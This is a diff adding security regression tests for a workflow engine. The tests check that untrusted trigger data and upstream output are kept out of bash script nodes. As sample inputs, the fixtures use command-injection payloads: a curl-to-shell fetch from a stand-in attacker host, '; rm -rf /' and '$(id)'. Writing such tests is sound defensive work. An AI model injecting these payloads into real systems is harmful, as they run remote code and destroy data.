@@ -11,7 +11,12 @@ import {
 } from "../be/db";
 import type { Workflow, WorkflowDefinition } from "../types";
 import { shouldSkipCooldown } from "../workflows/cooldown";
-import { findReadyNodes, startWorkflowExecution, walkGraph } from "../workflows/engine";
+import {
+  findReadyNodes,
+  interpolateNodeConfig,
+  startWorkflowExecution,
+  walkGraph,
+} from "../workflows/engine";
 import {
   BaseExecutor,
   type ExecutorDependencies,
@@ -809,5 +814,146 @@ describe("Workflow Engine v2 (Phase 3)", () => {
         echo: "got: hello",
       });
     });
+  });
+});
+
+// ─── interpolateNodeConfig: script-node trigger-data injection guard ─────
+// (superagent.sh report c27edfd7, finding b132d7c5 — untrusted trigger data
+// interpolated into an unsandboxed workflow script node)
+
+describe("interpolateNodeConfig — script node", () => {
+  test("trigger data is NOT substituted into `config.script` (stays a literal, unresolved token)", () => {
+    const node = {
+      type: "script",
+      config: {
+        runtime: "bash",
+        script: "echo {{trigger.payload}}",
+      },
+    };
+    const ctx = { trigger: { payload: "$(curl attacker.example/x | sh)" } };
+
+    const { value, unresolved } = interpolateNodeConfig(node, ctx);
+
+    const script = (value as { script: string }).script;
+    expect(script).not.toContain("curl attacker.example");
+    // Blanked to empty (existing deepInterpolate behavior for an unresolved
+    // token), not substituted with the attacker-controlled value.
+    expect(script).toBe("echo ");
+    expect(unresolved).toContain("trigger.payload");
+  });
+
+  test("input/workflow/swarm/run data (operator- or system-authored) is still interpolated into the script", () => {
+    const node = {
+      type: "script",
+      config: { runtime: "bash", script: "echo {{input.greeting}}" },
+    };
+    const ctx = { input: { greeting: "hello" }, trigger: { payload: "ignored" } };
+
+    const { value, unresolved } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("echo hello");
+    expect(unresolved).toEqual([]);
+  });
+
+  test("trigger data remains available on other config fields (e.g. args), just not `script`", () => {
+    const node = {
+      type: "script",
+      config: {
+        runtime: "bash",
+        script: "echo hi",
+        args: ["{{trigger.id}}"],
+      },
+    };
+    const ctx = { trigger: { id: "abc-123" } };
+
+    const { value } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("echo hi");
+    expect((value as { args: string[] }).args).toEqual(["abc-123"]);
+  });
+
+  test("non-script node types are unaffected (trigger still interpolates normally)", () => {
+    const node = { type: "notify", config: { template: "hi {{trigger.name}}" } };
+    const ctx = { trigger: { name: "world" } };
+
+    const { value } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { template: string }).template).toBe("hi world");
+  });
+
+  // A declared `inputs` alias is resolved by buildNodeInterpolationCtx BEFORE
+  // interpolateNodeConfig runs, so excluding only the literal `trigger` key
+  // left this path open (Reviewer finding on PR #1112).
+  test("an inputs alias POINTING AT trigger data is excluded from the script body", () => {
+    const node = {
+      type: "script",
+      inputs: { payload: "trigger.payload" },
+      config: { runtime: "bash", script: "echo {{payload}}" },
+    };
+    // The ctx buildNodeInterpolationCtx would produce for that node.
+    const ctx = {
+      trigger: { payload: "$(curl attacker.example/x | sh)" },
+      payload: "$(curl attacker.example/x | sh)",
+    };
+
+    const { value, unresolved } = interpolateNodeConfig(node, ctx);
+
+    const script = (value as { script: string }).script;
+    expect(script).not.toContain("curl attacker.example");
+    expect(script).toBe("echo ");
+    expect(unresolved).toContain("payload");
+  });
+
+  test("an alias that SHADOWS a builtin name but points at trigger data is excluded", () => {
+    const node = {
+      type: "script",
+      inputs: { input: "trigger.body" },
+      config: { runtime: "bash", script: "echo {{input}}" },
+    };
+    const ctx = { trigger: { body: "; rm -rf /" }, input: "; rm -rf /" };
+
+    const { value } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("echo ");
+  });
+
+  test("an inputs alias pointing at workflow input is still interpolated into the script", () => {
+    const node = {
+      type: "script",
+      inputs: { token: "input.API_TOKEN" },
+      config: { runtime: "bash", script: "curl -H 'Authorization: {{token}}' https://x" },
+    };
+    const ctx = { input: { API_TOKEN: "tok-123" }, token: "tok-123" };
+
+    const { value, unresolved } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("curl -H 'Authorization: tok-123' https://x");
+    expect(unresolved).toEqual([]);
+  });
+
+  test("upstream node output is excluded from the script body (LLM/script-generated text)", () => {
+    const node = {
+      type: "script",
+      config: { runtime: "bash", script: "echo {{fetchStep.stdout}}" },
+    };
+    const ctx = { fetchStep: { stdout: "$(id)" } };
+
+    const { value, unresolved } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("echo ");
+    expect(unresolved).toContain("fetchStep.stdout");
+  });
+
+  test("an inputs alias pointing at an upstream node output is excluded too", () => {
+    const node = {
+      type: "script",
+      inputs: { prev: "fetchStep.stdout" },
+      config: { runtime: "bash", script: "echo {{prev}}" },
+    };
+    const ctx = { fetchStep: { stdout: "$(id)" }, prev: "$(id)" };
+
+    const { value } = interpolateNodeConfig(node, ctx);
+
+    expect((value as { script: string }).script).toBe("echo ");
   });
 });
